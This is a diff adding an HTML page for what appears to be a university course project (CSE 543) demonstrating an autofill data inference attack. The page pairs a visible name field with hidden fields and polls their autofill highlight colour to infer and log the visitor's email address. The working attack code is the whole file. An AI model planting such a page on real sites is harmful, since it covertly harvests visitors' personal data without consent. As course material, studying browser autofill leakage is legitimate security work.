@@ -1,0 +1,111 @@
+
+
+<!DOCTYPE html>
+<head>
+  <title>CSE 543, AUTOFILL, Data Inference Attack</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+
+h2{
+  background-color: #4CAF50;
+  color: white;
+}
+#result{
+color:brown;
+}
+.button {
+background-color: white;
+color: black;
+border: 2px solid #4CAF50;
+}
+
+#name{
+  width: 500px;
+}
+  </style>
+
+</head>
+<body>
+    <h1 style="color:#041dff;">CSE 543, AUTOFILL, Data Inference Attack</h1>
+    <h2 id="result"></h2>
+
+<div>
+    Name<input id="name" autocomplete="name">
+    <button class="button" onclick="show()" >Show hidden fields</button>
+    <br>
+</div>
+
+<div id="drop-down" style="display: none;">
+
+</div>
+</body>
+<script>
+  const color_str = "rgb(232, 240, 254)";
+  var items = {};
+  var drop_down = document.getElementById("drop-down");
+  var result = document.getElementById("result");
+
+  fetch('select.txt')
+  .then(response => response.text())
+  .then(text => drop_down.innerHTML=text)
+
+  fetch('dict.json')
+  .then(response => response.json())
+  .then(jsonResponse => items = jsonResponse)
+
+  console.log( "Fetched the email data successfuly!!!!!" );
+  var i = 0;
+  const checkIfEqual = (first, second) => {
+    if (first === second) return true;
+    if (first == null || second == null) return false;
+    if (first.length != second.length) return false;
+
+    for (var i = 0; i < first.length; ++i) {
+      if (first[i] !== second[i]) return false;
+    }
+
+    return true;
+  }
+
+  setInterval(() => {
+    var results = [];
+    var matched;
+    var selects = drop_down.children;
+    for (var i = 0; i < selects.length; i++) {
+      if (getComputedStyle(selects[i]).backgroundColor == color_str){
+            results.push(parseInt(selects[i].id));
+          }
+    }
+    for (var key in items) {
+      var value = items[key];
+      if (checkIfEqual(value, results)){
+        console.log(key, value);
+        var matched = key;
+        break;
+      }
+    }
+
+    if (matched){
+      console.log("ATTACK SUCCESSFUL! USER EMAIL WAS STOLEN!!!!!")
+      console.log('Matched value is email'+ matched)
+      console.log("---------------------------------------------")
+    }
+
+  }, 100);
+
+  function show(){
+    var showthem = document.getElementById("drop-down");
+    var showbutton = document.getElementsByClassName("button")[0];
+    if (showthem.style.display === "none") {
+        showthem.style.display = "block";
+        showbutton.innerHTML = "Hide fields";
+    } else {
+        showthem.style.display = "none";
+        showbutton.innerHTML = "Show hidden fields";
+    }
+  }
+
+</script>
+</body>
+</html>
